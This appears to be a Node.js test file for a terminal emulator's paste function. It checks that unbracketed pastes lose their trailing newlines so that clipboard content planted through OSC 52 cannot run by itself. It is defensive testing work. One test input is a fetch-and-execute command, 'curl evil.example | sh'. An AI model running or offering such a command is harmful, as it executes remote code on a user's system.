'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
require('../src/toolbar.js');
const { pasteSequence } = globalThis.DEJIMA.toolbar;

// The clipboard is session-writable through OSC 52, so what PASTE sends is
// content that may not be the operator's. Without bracketed paste a trailing
// newline is Enter, and the difference between "text appeared at my prompt"
// and "text ran at my prompt" is exactly that byte.

test('bracketed paste sends the text unchanged, between the markers', () => {
  const r = pasteSequence('echo hi\n', true);
  assert.equal(r.send, '\x1b[200~echo hi\n\x1b[201~');
  assert.equal(r.warn, false, 'the application is told this is data');
});

test('an unbracketed paste never ends in a newline', () => {
  for (const ending of ['\n', '\r\n', '\n\n', '\r\n\r\n']) {
    const r = pasteSequence('curl evil.example | sh' + ending, false);
    assert.equal(r.send, 'curl evil.example | sh',
      `trailing ${JSON.stringify(ending)} would have run it`);
  }
});

test('an unbracketed paste with no newline is untouched and unremarked', () => {
  const r = pasteSequence('some text', false);
  assert.equal(r.send, 'some text');
  assert.equal(r.warn, false);
});

test('line breaks left in the middle are flagged, not removed', () => {
  const r = pasteSequence('one\ntwo\n', false);
  assert.equal(r.send, 'one\ntwo', 'only the trailing break is stripped');
  assert.equal(r.warn, true, 'the embedded break still arrives as Enter');
});

test('stripping does not turn a multi-line paste into a silent one', () => {
  // The warning keys on what is actually sent, not on what was on the
  // clipboard - a paste whose only break was the trailing one is now
  // single-line and has nothing to warn about.
  assert.equal(pasteSequence('single\n', false).warn, false);
});
